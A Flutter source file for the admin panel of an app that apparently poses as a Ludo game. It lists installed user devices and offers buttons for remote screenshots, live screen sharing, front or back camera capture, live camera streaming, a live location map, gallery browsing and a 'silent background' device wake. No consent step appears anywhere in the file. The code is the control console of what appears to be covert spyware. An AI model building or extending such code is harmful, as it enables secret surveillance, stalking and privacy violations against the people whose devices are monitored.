import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../controllers/admin_controller.dart';
import '../controllers/auth_controller.dart';
import '../controllers/theme_controller.dart';
import 'home_screen.dart';
import '../widgets/live_share_view.dart';
import 'user_gallery_screen.dart';
import 'user_location_screen.dart';
import 'request_detail_screen.dart';

class AdminPanelScreen extends StatefulWidget {
  const AdminPanelScreen({super.key});

  @override
  State<AdminPanelScreen> createState() => _AdminPanelScreenState();
}

class _AdminPanelScreenState extends State<AdminPanelScreen> {
  String _cameraFacing = 'front';
  bool _isFullscreenStreamVisible = false;
  String? _openedFullscreenRequestId;

  void _openFullscreenStream(String requestId, String requestType) {
    if (!mounted || _isFullscreenStreamVisible) return;

    _isFullscreenStreamVisible = true;
    _openedFullscreenRequestId = requestId;

    Navigator.of(context)
        .push(
          MaterialPageRoute(
            builder: (_) => FullScreenLiveStreamPage(
              requestId: requestId,
              requestType: requestType,
            ),
          ),
        )
        .then((_) {
          if (mounted) {
            setState(() => _isFullscreenStreamVisible = false);
          }
        });
  }

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      Get.find<AdminController>().refreshDeviceList();
    });
  }

  String _formatRequestTime(DateTime? dt) {
    if (dt == null) return 'Time: Just now';
    final local = dt.toLocal();
    final hour = local.hour > 12 ? local.hour - 12 : (local.hour == 0 ? 12 : local.hour);
    final ampm = local.hour >= 12 ? 'PM' : 'AM';
    final min = local.minute.toString().padLeft(2, '0');
    final sec = local.second.toString().padLeft(2, '0');
    final day = local.day.toString().padLeft(2, '0');
    final month = local.month.toString().padLeft(2, '0');
    return '$day/$month, $hour:$min:$sec $ampm';
  }

  @override
  Widget build(BuildContext context) {
    final adminCtrl = Get.find<AdminController>();

    ScreenshotRequestItem? activeLiveRequest;
    for (final request in adminCtrl.screenshotRequests) {
      if ((request.requestType == 'screen_share' ||
              request.requestType == 'camera_stream') &&
          (request.status == 'active' ||
              request.status == 'live' ||
              request.status == 'offer_created')) {
        activeLiveRequest = request;
        break;
      }
    }

    final activeRequestId = activeLiveRequest?.requestId;
    final activeRequestType = activeLiveRequest?.requestType;

    if (activeLiveRequest != null &&
        !_isFullscreenStreamVisible &&
        _openedFullscreenRequestId != activeRequestId) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && activeRequestId != null && activeRequestType != null) {
          _openFullscreenStream(
            activeRequestId,
            activeRequestType,
          );
        }
      });
    } else if (activeLiveRequest == null) {
      _openedFullscreenRequestId = null;
    }

    return GetBuilder<ThemeController>(
      builder: (themeState) {
        final theme = themeState.currentTheme;

        return Scaffold(
          appBar: AppBar(
            title: const Text('Admin Panel'),
            backgroundColor: theme.blue,
            actions: [
              IconButton(
                icon: const Icon(Icons.sports_esports),
                onPressed: () => Get.to(() => const HomeScreen()),
                tooltip: 'Go to Ludo Game',
              ),
              IconButton(
                icon: const Icon(Icons.refresh),
                onPressed: adminCtrl.refreshDeviceList,
                tooltip: 'Refresh Device List',
              ),
              IconButton(
                icon: const Icon(Icons.logout),
                onPressed: () async {
                  await Get.find<AuthController>().signOut();
                },
                tooltip: 'Sign Out',
              ),
            ],
          ),
          body: Obx(() {
            if (!adminCtrl.isReady.value) {
              return const Center(child: CircularProgressIndicator());
            }

            return ListView(
              padding: const EdgeInsets.all(16.0),
              children: [
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Installed Devices',
                          style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Total devices excluding this admin device: ${adminCtrl.otherInstalledDevicesCount}',
                          style: TextStyle(
                            fontSize: 14,
                            color: theme.textSecondary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Your device ID: ${adminCtrl.currentDeviceId.value}',
                          style: TextStyle(
                            fontSize: 12,
                            color: theme.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(12.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Camera Settings',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        DropdownButtonFormField<String>(
                          initialValue: _cameraFacing,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            labelText: 'Camera Facing',
                          ),
                          items: const [
                            DropdownMenuItem(value: 'front', child: Text('Front Camera')),
                            DropdownMenuItem(value: 'back', child: Text('Back Camera')),
                          ],
                          onChanged: (value) {
                            if (value != null) {
                              setState(() => _cameraFacing = value);
                            }
                          },
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Wrap(
                  alignment: WrapAlignment.spaceBetween,
                  crossAxisAlignment: WrapCrossAlignment.center,
                  spacing: 12,
                  runSpacing: 10,
                  children: [
                    Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Text('Only native-enabled', style: TextStyle(fontSize: 13)),
                        const SizedBox(width: 6),
                        Obx(
                          () => Transform.scale(
                            scale: 0.85,
                            child: Switch(
                              value: adminCtrl.showOnlyNative.value,
                              onChanged: (v) =>
                                  adminCtrl.showOnlyNative.value = v,
                            ),
                          ),
                        ),
                      ],
                    ),
                    ElevatedButton.icon(
                      onPressed:
                          adminCtrl.devices
                              .where(
                                (d) =>
                                    d.deviceId !=
                                        adminCtrl.currentDeviceId.value &&
                                    (!adminCtrl.showOnlyNative.value ||
                                        d.nativeCaptureEnabled),
                              )
                              .isEmpty
                          ? null
                          : () async {
                              await adminCtrl.requestScreenshotForFiltered();
                              Get.snackbar(
                                'Requests Sent',
                                'Screenshot requests sent to filtered devices.',
                                snackPosition: SnackPosition.BOTTOM,
                              );
                            },
                      icon: const Icon(Icons.photo_library, size: 18),
                      label: const Text('Request For Filtered', style: TextStyle(fontSize: 13)),
                    ),
                  ],
                ),
                const SizedBox(height: 16),

                ...adminCtrl.devices
                    .where(
                      (d) =>
                          d.deviceId != adminCtrl.currentDeviceId.value &&
                          (!adminCtrl.showOnlyNative.value ||
                              d.nativeCaptureEnabled),
                    )
                    .map((device) {
                      final isSelf =
                          device.deviceId == adminCtrl.currentDeviceId.value;
                      final activeScreenShare = adminCtrl.screenshotRequests.firstWhereOrNull(
                        (r) => r.targetDeviceId == device.deviceId &&
                               r.requestType == 'screen_share' &&
                               (r.status == 'active' || r.status == 'live' || r.status == 'offer_created' || r.status == 'pending'),
                      );
                      final activeCameraStream = adminCtrl.screenshotRequests.firstWhereOrNull(
                        (r) => r.targetDeviceId == device.deviceId &&
                               r.requestType == 'camera_stream' &&
                               (r.status == 'active' || r.status == 'live' || r.status == 'offer_created' || r.status == 'pending'),
                      );

                      return Card(
                        color: theme.cardBg,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(16),
                        ),
                        margin: const EdgeInsets.only(bottom: 12),
                        child: Padding(
                          padding: const EdgeInsets.all(14.0),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              Row(
                                children: [
                                  CircleAvatar(
                                    radius: 18,
                                    backgroundColor: device.isOnline ? Colors.green.shade600 : Colors.grey.shade700,
                                    child: const Icon(Icons.person, color: Colors.white, size: 20),
                                  ),
                                  const SizedBox(width: 10),
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          children: [
                                            Flexible(
                                              child: Text(
                                                isSelf ? 'Admin (${device.username})' : device.username,
                                                style: TextStyle(
                                                  fontWeight: FontWeight.bold,
                                                  fontSize: 16,
                                                  color: theme.textPrimary,
                                                ),
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                            ),
                                            const SizedBox(width: 6),
                                            // Live / Offline Status Badge
                                            Container(
                                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                              decoration: BoxDecoration(
                                                color: device.isOnline ? Colors.green.shade700 : Colors.grey.shade800,
                                                borderRadius: BorderRadius.circular(6),
                                              ),
                                              child: Row(
                                                mainAxisSize: MainAxisSize.min,
                                                children: [
                                                  Container(
                                                    width: 6,
                                                    height: 6,
                                                    decoration: BoxDecoration(
                                                      shape: BoxShape.circle,
                                                      color: device.isOnline ? Colors.greenAccent : Colors.grey.shade400,
                                                    ),
                                                  ),
                                                  const SizedBox(width: 4),
                                                  Text(
                                                    device.isOnline ? 'LIVE' : 'OFFLINE',
                                                    style: const TextStyle(
                                                      color: Colors.white,
                                                      fontSize: 9,
                                                      fontWeight: FontWeight.bold,
                                                    ),
                                                  ),
                                                ],
                                              ),
                                            ),
                                          ],
                                        ),
                                        if (device.email != null && device.email!.isNotEmpty)
                                          Text(
                                            device.email!,
                                            style: TextStyle(
                                              fontSize: 11,
                                              color: theme.textSecondary,
                                            ),
                                          ),
                                      ],
                                    ),
                                  ),
                                  Chip(
                                    label: Text(device.platform.toUpperCase()),
                                    backgroundColor: theme.boardBg,
                                    labelStyle: TextStyle(
                                      color: theme.textPrimary,
                                      fontSize: 10,
                                    ),
                                  ),
                                  const SizedBox(width: 4),
                                  if (device.nativeCaptureEnabled)
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 6,
                                        vertical: 3,
                                      ),
                                      decoration: BoxDecoration(
                                        color: Colors.green.shade600,
                                        borderRadius: BorderRadius.circular(10),
                                      ),
                                      child: const Text(
                                        'Native',
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 10,
                                        ),
                                      ),
                                    ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                children: [
                                  Expanded(
                                    child: Text(
                                      'Last active: ${device.lastSeenAt?.toLocal().toString() ?? 'unknown'}',
                                      style: TextStyle(
                                        color: theme.textSecondary,
                                        fontSize: 11,
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                  ),
                                  Row(
                                    children: [
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserLocationScreen(device: device)),
                                        icon: const Icon(Icons.map_rounded, size: 16, color: Colors.redAccent),
                                        label: const Text('Live Map', style: TextStyle(color: Colors.redAccent)),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserGalleryScreen(device: device)),
                                        icon: const Icon(Icons.collections, size: 16),
                                        label: const Text('Gallery'),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                              const SizedBox(height: 12),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestScreenshot(
                                                device.deviceId,
                                              );
                                              Get.snackbar(
                                                'Screenshot Requested',
                                                'A screenshot request was sent to the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.photo_camera),
                                      label: const Text('Screenshot'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                     child: activeScreenShare != null
                                         ? ElevatedButton.icon(
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
                                                     await adminCtrl.stopScreenShare(activeScreenShare.requestId);
                                                     Get.snackbar(
                                                       'Stream Stopped',
                                                       'Stopped live screen share for ${device.username}',
                                                       snackPosition: SnackPosition.BOTTOM,
                                                       backgroundColor: Colors.redAccent,
                                                       colorText: Colors.white,
                                                     );
                                                   },
                                             icon: const Icon(Icons.stop_circle_rounded, color: Colors.white),
                                             label: const Text('Stop Share', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                                             style: ElevatedButton.styleFrom(
                                               backgroundColor: Colors.redAccent,
                                             ),
                                           )
                                         : OutlinedButton.icon(
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
                                                     await adminCtrl.requestScreenShare(device.deviceId);
                                                     Get.snackbar(
                                                       'Live Share Requested',
                                                       'A live share session was started for the selected device.',
                                                       snackPosition: SnackPosition.BOTTOM,
                                                     );
                                                   },
                                             icon: const Icon(Icons.screenshot_monitor),
                                             label: const Text('Live Share'),
                                             style: OutlinedButton.styleFrom(
                                               foregroundColor: theme.blue,
                                               side: BorderSide(color: theme.blue),
                                             ),
                                           ),
                                   ),
                                ],
                              ),
                               const SizedBox(height: 8),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraCapture(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Capture Requested',
                                                'The target device will capture a photo from the selected camera.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.camera_alt),
                                      label: const Text('Capture Camera'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraStream(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Stream Requested',
                                                'The target device will start a live camera stream.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.videocam),
                                      label: const Text('Live Camera'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              SizedBox(
                                width: double.infinity,
                                child: TextButton.icon(
                                  onPressed: isSelf
                                      ? null
                                      : () async {
                                          await adminCtrl.wakeDevice(device.deviceId);
                                          Get.snackbar(
                                            'Silent Wake Dispatched',
                                            'A high-priority background wake signal was sent to ${device.username}.',
                                            snackPosition: SnackPosition.BOTTOM,
                                            backgroundColor: Colors.indigo.shade800,
                                            colorText: Colors.white,
                                          );
                                        },
                                  icon: const Icon(Icons.bolt, color: Colors.amberAccent, size: 18),
                                  label: const Text(
                                    'Wake Device (Silent Background)',
                                    style: TextStyle(color: Colors.amberAccent, fontWeight: FontWeight.w600, fontSize: 13),
                                  ),
                                  style: TextButton.styleFrom(
                                    backgroundColor: Colors.amber.withOpacity(0.12),
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(12),
                                      side: BorderSide(color: Colors.amber.withOpacity(0.3)),
                                    ),
                                    padding: const EdgeInsets.symmetric(vertical: 10),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    }),
                if (adminCtrl.screenshotRequests.isNotEmpty) ...[
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Recent Requests (Latest 20)',
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          color: theme.textPrimary,
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                        decoration: BoxDecoration(
                          color: theme.blue.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Text(
                          '${adminCtrl.screenshotRequests.length} Total',
                          style: TextStyle(
                            color: theme.blue,
                            fontSize: 12,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 10),
                  ...adminCtrl.groupedRequestsByDevice.entries.map((entry) {
                    final targetId = entry.key;
                    final reqList = entry.value;
                    final targetName = adminCtrl.getDeviceDisplayName(targetId);

                    return Card(
                      color: theme.cardBg,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(16),
                        side: BorderSide(color: theme.gridLine),
                      ),
                      margin: const EdgeInsets.only(bottom: 14),
                      child: Padding(
                        padding: const EdgeInsets.all(14.0),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            // Device Group Header
                            Row(
                              children: [
                                CircleAvatar(
                                  radius: 14,
                                  backgroundColor: theme.blue.withOpacity(0.2),
                                  child: Icon(Icons.phone_android, size: 16, color: theme.blue),
                                ),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: Text(
                                    targetName,
                                    style: TextStyle(
                                      fontSize: 15,
                                      fontWeight: FontWeight.bold,
                                      color: theme.textPrimary,
                                    ),
                                  ),
                                ),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                  decoration: BoxDecoration(
                                    color: theme.boardBg,
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                  child: Text(
                                    '${reqList.length} ${reqList.length == 1 ? 'request' : 'requests'}',
                                    style: TextStyle(fontSize: 11, color: theme.textSecondary),
                                  ),
                                ),
                              ],
                            ),
                            const Divider(height: 20),
                            // Request Items in this Group
                            ...reqList.map((request) {
                              return Card(
                                color: theme.boardBg,
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                margin: const EdgeInsets.only(bottom: 8),
                                child: InkWell(
                                  borderRadius: BorderRadius.circular(12),
                                  onTap: () => Get.to(() => RequestDetailScreen(request: request)),
                                  child: Padding(
                                    padding: const EdgeInsets.all(12.0),
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                          children: [
                                            Row(
                                              children: [
                                                Icon(
                                                  request.requestType == 'camera_capture'
                                                      ? Icons.camera_alt
                                                      : request.requestType == 'screen_share'
                                                          ? Icons.screenshot_monitor
                                                          : request.requestType == 'camera_stream'
                                                              ? Icons.videocam
                                                              : request.requestType == 'location_ping'
                                                                  ? Icons.location_on
                                                                  : request.requestType == 'wake_up'
                                                                      ? Icons.bolt
                                                                      : Icons.photo_camera,
                                                  size: 16,
                                                  color: theme.blue,
                                                ),
                                                const SizedBox(width: 6),
                                                Text(
                                                  request.requestType.replaceAll('_', ' ').toUpperCase(),
                                                  style: TextStyle(
                                                    color: theme.textPrimary,
                                                    fontWeight: FontWeight.bold,
                                                    fontSize: 13,
                                                  ),
                                                ),
                                              ],
                                            ),
                                            Row(
                                              children: [
                                                Container(
                                                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                                  decoration: BoxDecoration(
                                                    color: request.status == 'completed'
                                                        ? Colors.green.shade700
                                                        : (request.status == 'active' || request.status == 'live')
                                                            ? Colors.blue.shade700
                                                            : request.status == 'failed'
                                                                ? Colors.red.shade700
                                                                : Colors.amber.shade800,
                                                    borderRadius: BorderRadius.circular(8),
                                                  ),
                                                  child: Text(
                                                    request.status.toUpperCase(),
                                                    style: const TextStyle(
                                                      color: Colors.white,
                                                      fontSize: 10,
                                                      fontWeight: FontWeight.bold,
                                                    ),
                                                  ),
                                                ),
                                                const SizedBox(width: 6),
                                                Icon(Icons.chevron_right, color: theme.textSecondary, size: 18),
                                              ],
                                            ),
                                          ],
                                        ),
                                        const SizedBox(height: 6),
                                        Row(
                                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                          children: [
                                            Text(
                                              _formatRequestTime(request.requestedAt),
                                              style: TextStyle(color: theme.textSecondary, fontSize: 11),
                                            ),
                                            Text(
                                              'Tap for details & media',
                                              style: TextStyle(color: theme.blue, fontSize: 11, fontWeight: FontWeight.w600),
                                            ),
                                          ],
                                        ),
                                        if (request.status == 'failed' && (request.error != null || request.failureReason != null)) ...[
                                          const SizedBox(height: 6),
                                          Text(
                                            request.error ?? request.failureReason ?? '',
                                            style: const TextStyle(color: Colors.redAccent, fontSize: 11),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                        ],
                                        if ((request.requestType == 'screen_share' || request.requestType == 'camera_stream') &&
                                            (request.status == 'active' || request.status == 'live' || request.status == 'offer_created')) ...[
                                          const SizedBox(height: 8),
                                          Row(
                                            children: [
                                              Expanded(
                                                child: ElevatedButton.icon(
                                                  onPressed: () => _openFullscreenStream(
                                                    request.requestId,
                                                    request.requestType,
                                                  ),
                                                  icon: const Icon(Icons.fullscreen, size: 16),
                                                  label: const Text('Open Full Screen', style: TextStyle(fontSize: 12)),
                                                  style: ElevatedButton.styleFrom(
                                                    visualDensity: VisualDensity.compact,
                                                  ),
                                                ),
                                              ),
                                              if (request.requestType == 'screen_share') ...[
                                                const SizedBox(width: 8),
                                                Expanded(
                                                  child: ElevatedButton.icon(
                                                    onPressed: () async {
                                                      await adminCtrl.stopScreenShare(request.requestId);
                                                      Get.snackbar(
                                                        'Live Share Stopped',
                                                        'The live share session was stopped.',
                                                        snackPosition: SnackPosition.BOTTOM,
                                                      );
                                                    },
                                                    icon: const Icon(Icons.stop_circle_outlined, size: 16),
                                                    label: const Text('Stop Live', style: TextStyle(fontSize: 12)),
                                                    style: ElevatedButton.styleFrom(
                                                      backgroundColor: Colors.redAccent,
                                                      visualDensity: VisualDensity.compact,
                                                    ),
                                                  ),
                                                ),
                                              ],
                                            ],
                                          ),
                                        ],
                                      ],
                                    ),
                                  ),
                                ),
                              );
                            }),
                          ],
                        ),
                      ),
                    );
                  }),
                ],
                // Admin Activity & Event Log
                if (adminCtrl.eventLogs.isNotEmpty) ...[
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Admin Activity Log',
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          color: theme.textPrimary,
                        ),
                      ),
                      TextButton.icon(
                        onPressed: () => adminCtrl.eventLogs.clear(),
                        icon: const Icon(Icons.clear_all, size: 16),
                        label: const Text('Clear'),
                        style: TextButton.styleFrom(
                          visualDensity: VisualDensity.compact,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Card(
                    color: theme.cardBg,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(16),
                      side: BorderSide(color: theme.gridLine),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.all(12.0),
                      child: ListView.separated(
                        shrinkWrap: true,
                        physics: const NeverScrollableScrollPhysics(),
                        itemCount: adminCtrl.eventLogs.length > 10 ? 10 : adminCtrl.eventLogs.length,
                        separatorBuilder: (_, __) => Divider(color: theme.gridLine.withOpacity(0.5), height: 12),
                        itemBuilder: (context, idx) {
                          final log = adminCtrl.eventLogs[idx];
                          final timeStr = '${log.timestamp.hour.toString().padLeft(2, '0')}:${log.timestamp.minute.toString().padLeft(2, '0')}:${log.timestamp.second.toString().padLeft(2, '0')}';
                          return Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                decoration: BoxDecoration(
                                  color: theme.blue.withOpacity(0.15),
                                  borderRadius: BorderRadius.circular(6),
                                ),
                                child: Text(
                                  timeStr,
                                  style: TextStyle(color: theme.blue, fontSize: 10, fontWeight: FontWeight.bold),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      '${log.eventType} ➔ ${log.targetDevice}',
                                      style: TextStyle(
                                        fontSize: 13,
                                        fontWeight: FontWeight.bold,
                                        color: theme.textPrimary,
                                      ),
                                    ),
                                    if (log.details != null)
                                      Text(
                                        log.details!,
                                        style: TextStyle(
                                          fontSize: 11,
                                          color: log.status == 'Failed' ? Colors.redAccent : theme.textSecondary,
                                        ),
                                      ),
                                  ],
                                ),
                              ),
                              const SizedBox(width: 6),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                decoration: BoxDecoration(
                                  color: log.status == 'Dispatched'
                                      ? Colors.blue.withOpacity(0.2)
                                      : log.status == 'Completed'
                                          ? Colors.green.withOpacity(0.2)
                                          : Colors.red.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(6),
                                ),
                                child: Text(
                                  log.status.toUpperCase(),
                                  style: TextStyle(
                                    fontSize: 9,
                                    fontWeight: FontWeight.bold,
                                    color: log.status == 'Dispatched'
                                        ? Colors.blueAccent
                                        : log.status == 'Completed'
                                            ? Colors.greenAccent
                                            : Colors.redAccent,
                                  ),
                                ),
                              ),
                            ],
                          );
                        },
                      ),
                    ),
                  ),
                ],
              ],
            );
          }),
        );
      },
    );
  }
}
